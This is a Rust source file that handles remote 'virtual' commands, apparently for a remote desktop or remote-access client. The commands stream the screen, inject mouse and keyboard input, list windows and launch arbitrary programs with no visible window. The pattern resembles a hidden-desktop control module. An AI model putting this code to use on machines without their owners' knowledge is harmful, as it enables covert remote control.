use std::sync::atomic::Ordering;

use tokio_util::sync::CancellationToken;

use crate::commands::{Ctx, desktop, input};

pub async fn handle(ctx: Ctx) {
    match ctx.command.name.as_str() {
        "virtual_start" => {
            let state = ctx.state.clone();
            let out = ctx.out.clone();
            let settings = state.virtual_settings.clone();
            let cancel = CancellationToken::new();
            crate::state::set_stream(&state.virtual_stream, cancel.clone(), settings.clone());
            tokio::spawn(async move {
                desktop::stream_loop(state, out, settings, cancel, true, false).await;
            });
            ctx.out.result(&ctx.command, true, None).await;
        }
        "virtual_stop" => {
            crate::state::cancel_stream(&ctx.state.virtual_stream);
            ctx.out.result(&ctx.command, true, None).await;
        }
        "virtual_set_fps" => {
            let fps = ctx.integer("fps").unwrap_or(120).clamp(1, 240) as u32;
            ctx.state
                .virtual_settings
                .fps
                .store(fps, Ordering::Relaxed);
            ctx.out.result(&ctx.command, true, None).await;
        }
        "virtual_set_quality" => {
            let quality = ctx.integer("quality").unwrap_or(90).clamp(1, 100) as u32;
            ctx.state
                .virtual_settings
                .quality
                .store(quality, Ordering::Relaxed);
            ctx.out.result(&ctx.command, true, None).await;
        }
        "virtual_request_keyframe" => {
            ctx.out.result(&ctx.command, true, None).await;
        }
        "virtual_enable_mouse" => {
            let enabled = ctx.boolean_or("enabled", true);
            ctx.state
                .virtual_input
                .mouse
                .store(enabled, Ordering::Relaxed);
            ctx.out.result(&ctx.command, true, None).await;
        }
        "virtual_enable_keyboard" => {
            let enabled = ctx.boolean_or("enabled", true);
            ctx.state
                .virtual_input
                .keyboard
                .store(enabled, Ordering::Relaxed);
            ctx.out.result(&ctx.command, true, None).await;
        }
        "virtual_enable_cursor" => {
            let enabled = ctx.boolean_or("enabled", false);
            ctx.state
                .virtual_input
                .cursor
                .store(enabled, Ordering::Relaxed);
            ctx.state
                .virtual_settings
                .cursor
                .store(enabled, Ordering::Relaxed);
            ctx.out.result(&ctx.command, true, None).await;
        }
        "virtual_mouse_move" => {
            if !ctx.state.virtual_input.mouse.load(Ordering::Relaxed) {
                ctx.out.result(&ctx.command, true, None).await;
            } else {
                let x = ctx.integer("x").unwrap_or(0);
                let y = ctx.integer("y").unwrap_or(0);
                let (absolute_x, absolute_y) = input::resolve_point(
                    ctx.state.virtual_settings.display.load(Ordering::Relaxed),
                    ctx.state.virtual_settings.max_height.load(Ordering::Relaxed),
                    x,
                    y,
                );
                #[cfg(windows)]
                crate::win::input::move_cursor(absolute_x, absolute_y);
            }
        }
        "virtual_mouse_down" | "virtual_mouse_up" | "virtual_mouse_wheel" => {
            if !ctx.state.virtual_input.mouse.load(Ordering::Relaxed) {
                ctx.out.result(&ctx.command, true, None).await;
            } else {
                #[cfg(windows)]
                {
                    if ctx.command.name == "virtual_mouse_wheel" {
                        crate::win::input::mouse_wheel(ctx.integer("delta").unwrap_or(0) as i32);
                    } else {
                        let button = ctx.integer("button").unwrap_or(0);
                        crate::win::input::mouse_button(button, ctx.command.name == "virtual_mouse_down");
                    }
                }
            }
        }
        "virtual_key_down" | "virtual_key_up" => {
            if !ctx.state.virtual_input.keyboard.load(Ordering::Relaxed) {
                ctx.out.result(&ctx.command, true, None).await;
            } else {
                let code = ctx.string("code").unwrap_or("");
                #[cfg(windows)]
                {
                    let vk = crate::win::input::dom_code_to_vk(code);
                    if vk != 0 {
                        crate::win::input::key(vk, ctx.command.name == "virtual_key_down");
                    }
                }
            }
        }
        "virtual_start_process" => {
            let path = ctx.string("path").unwrap_or("").to_owned();
            ctx.out.result(&ctx.command, true, None).await;
            let _ = tokio::task::spawn_blocking(move || {
                #[cfg(windows)]
                {
                    use std::os::windows::process::CommandExt;
                    let _ = std::process::Command::new(&path)
                        .creation_flags(0x08000000)
                        .spawn();
                }
                #[cfg(not(windows))]
                {
                    let _ = std::process::Command::new(&path).spawn();
                }
            })
            .await;
        }
        "virtual_kill_all" => {
            ctx.out.result(&ctx.command, true, None).await;
        }
        "virtual_window_list" => {
            ctx.out.result(&ctx.command, true, None).await;
            crate::commands::backstage::send_window_list(&ctx).await;
        }
        _ => {
            ctx.out
                .result(&ctx.command, false, Some("unknown virtual command"))
                .await;
        }
    }
}
